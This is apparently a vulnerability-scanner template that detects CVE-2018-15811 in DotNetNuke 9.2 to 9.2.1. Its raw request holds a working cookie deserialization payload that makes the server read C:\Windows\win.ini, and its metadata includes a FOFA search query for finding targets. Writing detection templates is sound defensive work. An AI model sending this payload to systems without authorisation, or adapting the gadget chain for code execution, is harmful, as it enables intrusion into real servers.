http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - '[extensions]'
    - for 16-bit app support
  - status:
    - 404
    type: status
  matchers-condition: and
  raw:
  - 'GET /__ HTTP/1.1

    Host: {{Hostname}}

    Accept: text/javascript, application/javascript, application/ecmascript, application/x-ecmascript,
    */*; q=0.01

    X-Requested-With: XMLHttpRequest

    Cookie: dnn_IsMobile=False; DNNPersonalization=<profile><item key="name1: key1"
    type="System.Data.Services.Internal.ExpandedWrapper`2[[DotNetNuke.Common.Utilities.FileSystemUtils],[System.Windows.Data.ObjectDataProvider,
    PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35]],
    System.Data.Services, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"><ExpandedWrapperOfFileSystemUtilsObjectDataProvider
    xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><ExpandedElement/><ProjectedProperty0><MethodName>WriteFile</MethodName><MethodParameters><anyType
    xsi:type="xsd:string">C:\Windows\win.ini</anyType></MethodParameters><ObjectInstance
    xsi:type="FileSystemUtils"></ObjectInstance></ProjectedProperty0></ExpandedWrapperOfFileSystemUtilsObjectDataProvider></item></profile>

    '
id: CVE-2018-15811
info:
  author: pdteam
  classification:
    cpe: cpe:2.3:a:dnnsoftware:dotnetnuke:*:*:*:*:*:*:*:*
    cve-id: CVE-2018-15811
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-326
    epss-percentile: 0.99647
    epss-score: 0.9148
  description: 'DNN (DotNetNuke) versions 9.2 through 9.2.1 use a weak encryption
    algorithm to protect input parameters. This cryptographic weakness enables attackers
    to craft malicious DNNPersonalization cookies that can be deserialized, leading
    to remote code execution.

    '
  impact: 'Attackers can exploit weak encryption to decrypt or tamper with input parameters
    and execute arbitrary code through cookie deserialization attacks.

    '
  metadata:
    fofa-query: app="dotnetnuke"
    max-request: 1
    product: dotnetnuke
    vendor: dnnsoftware
    verified: true
  name: DotNetNuke 9.2 - 9.2.1 - Weak Encryption & Cookie Deserialization
  reference:
  - https://nvd.nist.gov/vuln/detail/CVE-2018-15811
  - https://github.com/dnnsoftware/Dnn.Platform/releases
  - http://packetstormsecurity.com/files/157080/DotNetNuke-Cookie-Deserialization-Remote-Code-Execution.html
  - https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/http/dnn_cookie_deserialization_rce.rb
  remediation: 'Update to DotNetNuke version 9.2.2 or later which addresses the weak
    encryption issues.

    '
  severity: high
  tags: cve,cve2018,dotnetnuke,crypto,deserialization,rce,kev,dnnsoftware,vkev,vuln
